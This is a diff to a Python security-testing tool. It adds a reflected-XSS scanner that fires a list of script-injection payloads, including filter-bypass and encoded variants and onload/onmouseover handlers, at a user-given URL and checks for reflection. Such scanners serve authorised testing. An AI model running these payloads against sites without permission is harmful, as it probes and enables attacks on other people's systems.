@@ -5,7 +5,8 @@ from mods import a_main
 def sqliscan():
     try:
         print('  SQLI Scan')
-        url = input('  set URL> ')
+        print("  example: http://example/listproducts.php?cat=1")
+        url = input('  [\033[1;31murl\033[0;0m]> > ')
     except:
         print('  [\033[1;31m!\033[0;0m]- Something was wrong.')
         input('press enter')
@@ -37,6 +38,48 @@ def sqliscan():
                '   The target looks vulnerable!')
     else:
         print ('[!]- No error found.')
+
+    input('press enter')
+    a_main.a_main()
+
+def xssscan():
+    def lin():
+        print('\033[1;32m>--------------------------------------------------------------------------------------\033[0;0m')
+
+    cou = 0
+    payl = ["<script>alert('axex')</script>", "><script>alert('axex')</script>", \
+            "<scr<script>ipt>alert(/axex/)</scr</script>ipt>", "%253script%253ealert(/axex/)%253c/script%253e", \
+            ">head<script>alert('axex')</script>head>", "<IMG onmouseover=\"alert('axex')\">",
+            "</script><script>alert('axex');</script>", \
+            "Axex</script><script>alert(axex)</script>Axex", "<h1>Axex</h1>", "<svg/onload=alert(axex)>//INJECTX", \
+            "<iframe/onload=alert(/INJECTX/)>"]
+    try:
+        print('  XSS Reflected Url Exploitable')
+        print("  example: http://example/listproducts.php?cat=")
+        url = input('  [\033[1;31murl\033[0;0m]> ')
+        print("\n")
+        print("\033[1;32m|\033[0;0mXss Payloads:", len(payl), " Tartg:", url)
+        lin()
+
+        for pay in payl:
+            cou = cou + 1
+            print("\033[1;32m+\033[0;0mXSS Payload:", cou, " ", pay)
+            print("\033[1;32m|\033[0;0mTarget:", url)
+            try:
+                html = requests.get(url + pay)
+                chek = html.text
+                if pay in chek:
+                    print("\033[1;32m+---------Found\033[0;0m")
+                else:
+                    print("\033[1;31m+---------Not Found\033[0;0m")
+            except:
+                print("erro")
+            lin()
+
+    except:
+        print('  [\033[1;31m!\033[0;0m]- Something was wrong.')
+        input('press enter')
+        xssscan()
 
     input('press enter')
     a_main.a_main()
